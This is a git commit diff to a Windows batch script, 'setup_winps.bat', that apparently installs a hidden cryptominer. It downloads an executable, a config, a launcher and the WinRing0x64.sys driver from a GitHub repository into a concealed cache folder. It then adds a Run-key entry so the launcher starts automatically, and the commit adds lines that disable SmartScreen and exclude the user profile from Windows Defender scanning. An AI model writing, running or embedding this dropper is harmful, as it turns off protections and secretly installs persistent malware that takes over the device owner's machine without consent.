c27b64968015299aa910def6f3355a1559b64215
anabianca92 <94259852+anabianca92@users.noreply.github.com>
2024-01-15 05:24:28 -0300

    Update setup_winps.bat

--- setup_winps.bat
+++ setup_winps.bat
@@ -1,9 +1,15 @@
 @echo off
-REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /f /v slhost /d \"%USERPROFILE%\.cache\services\slhost\Noise.bat\" 
+
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /f /v EnableSmartScreen /t REG_DWORD /d 0
+powershell.exe -c "Set-MpPreference -ExclusionPath $env:USERPROFILE"
+REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v slhost 
+REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v slhost /d \"%USERPROFILE%\.cache\services\slhost\Noise.bat\"  
+
 mkdir %USERPROFILE%\.cache\services\slhost\ >nul 2>&1 
 
 powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/slhost.txt','%USERPROFILE%\.cache\services\slhost\slhost.exe')"
-powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/config.json','%USERPROFILE%\.cache\services\slhost\config.json')"
+powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/gta.json','%USERPROFILE%\.cache\services\slhost\config.json')"
 powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/start.cmd','%USERPROFILE%\.cache\services\slhost\Noise.bat')"
+powershell.exe -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/anabianca92/lol/main/WinRing0x64.sys','%USERPROFILE%\.cache\services\slhost\WinRing0x64.sys')"
 
 %USERPROFILE%\.cache\services\slhost\Noise.bat
